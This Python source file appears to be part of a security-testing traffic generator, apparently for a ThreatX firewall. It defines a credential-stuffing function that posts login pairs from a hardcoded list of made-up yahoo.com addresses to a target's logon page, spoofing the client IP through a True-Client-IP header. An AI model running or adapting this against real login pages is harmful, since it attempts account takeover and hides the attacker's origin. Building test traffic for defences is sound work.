import random
import requests
from time import sleep

# send creds from a list to /?target=your-user-logon-page
def credential_stuffing(target, source_ip, user_agent, **kwargs):

    #usernames and passwords to try
    cred_list = [
                    { 'username': 'dslm4d@yahoo.com', 'password': 'zxcvb4n0' },
                    { 'username': 'aem2ns@yahoo.com', 'password': 'zxcvb4na' },
                    { 'username': 'psl35m@yahoo.com', 'password': 'zxcvb4nb' },
                    { 'username': 'apwmis@yahoo.com', 'password': 'zxcvb4nc' },
                    { 'username': 'a3m3nc@yahoo.com', 'password': 'zxcvb4nd' },
                    { 'username': 'plsme2@yahoo.com', 'password': 'zxcvb4ne' },
                    { 'username': 'cvmosn@yahoo.com', 'password': 'zxcvb4nf' },
                    { 'username': 'ap2lam@yahoo.com', 'password': 'zxcvb4ng' },
                    { 'username': 'ziuwnd@yahoo.com', 'password': 'zxcvb4nh' },
                    { 'username': 'pwlemb@yahoo.com', 'password': 'zxcvb4ni' },
                    { 'username': 'yisna2@yahoo.com', 'password': 'zxcvb4nj' },
                    { 'username': 'p02lcn@yahoo.com', 'password': 'zxcvb4nk' },
                    { 'username': 'zp2mai@yahoo.com', 'password': 'zxcvb4nl' },
                    { 'username': 'sdfm2i@yahoo.com', 'password': 'zxcvb4nm' },
                    { 'username': 'sodm4n@yahoo.com', 'password': 'zxcvb4nn' },
                    { 'username': 'zxpl2m@yahoo.com', 'password': 'zxcvb4no' },
                    { 'username': 'wnru2d@yahoo.com', 'password': 'zxcvb4np' },
                    { 'username': 'rulqna@yahoo.com', 'password': 'zxcvb4nq' },
                    { 'username': 'ep2mea@yahoo.com', 'password': 'zxcvb4nr' },
                    { 'username': '3m1caz@yahoo.com', 'password': 'zxcvb4ns' },
                    { 'username': 'l3pcox@yahoo.com', 'password': 'zxcvb4nt' },
                    { 'username': 'fiqnz6@yahoo.com', 'password': 'zxcvb4nu' },
                    { 'username': 'qm2nfj@yahoo.com', 'password': 'zxcvb4nv' },
                    { 'username': '3msn1d@yahoo.com', 'password': 'zxcvb4nw' },
                    { 'username': '4l30fm@yahoo.com', 'password': 'zxcvb4nx' },
                    { 'username': 'fl3nmc@yahoo.com', 'password': 'zxcvb4ny' },
                    { 'username': '3kwnhx@yahoo.com', 'password': 'zxcvb4nz' }
                ]


    headers = {'User-Agent': user_agent,
               'True-Client-IP': str(source_ip),
               'Content-Type': 'application/x-www-form-urlencoded',
               'X-ThreatX-Scan': 'credential_stuffing'
              }

    count=random.randint(5,10)

    for i in range(count):

        cred = random.choice(cred_list)

        attack = {
                  "method": "POST",
                  "url": "{}/?target=your-user-logon-page".format(target),
                  "payload": {"log": cred['username'], "pwd": cred['password']}
                  }
        response = requests.request(attack['method'], attack['url'], headers=headers, data=attack['payload']).status_code

        sleep(5)

    return("credential_stuffing: sent {} creds to {}/?target=your-user-logon-page".format(count,target))
